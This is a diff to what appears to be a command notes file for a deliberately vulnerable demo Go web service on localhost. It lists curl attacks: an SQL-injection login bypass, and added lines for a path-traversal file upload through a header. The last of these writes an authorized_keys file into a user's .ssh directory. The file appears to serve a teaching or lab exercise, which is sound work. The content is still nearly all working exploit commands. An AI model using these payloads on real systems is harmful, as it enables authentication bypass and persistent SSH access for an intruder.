@@ -30,3 +30,11 @@ curl -sw 'Status Code: %{http_code}' -X POST 'localhost:8081/login' -d '{ "email
 # Login Bypass
 # ' --
 curl -v -X POST 'localhost:8081/login' -d "{ \"email\": \"gopher@golang.org' --\",\"password\": \"doesn't matter\"}" | jq
+
+# File Upload
+curl -sw 'Status Code: %{http_code}' -H "userId:10" -F 'file=@./gopherme.png' 'localhost:8081/images'
+
+# File Upload - Probe Path
+curl -sw 'Status Code: %{http_code}' -H "userId:../" -F 'file=@./gopherme.png' 'localhost:8081/images'
+
+curl -sw 'Status Code: %{http_code}' -H "userId:../../../../../benji/.ssh/" -F 'file=@./authorized_keys' 'localhost:8081/images'
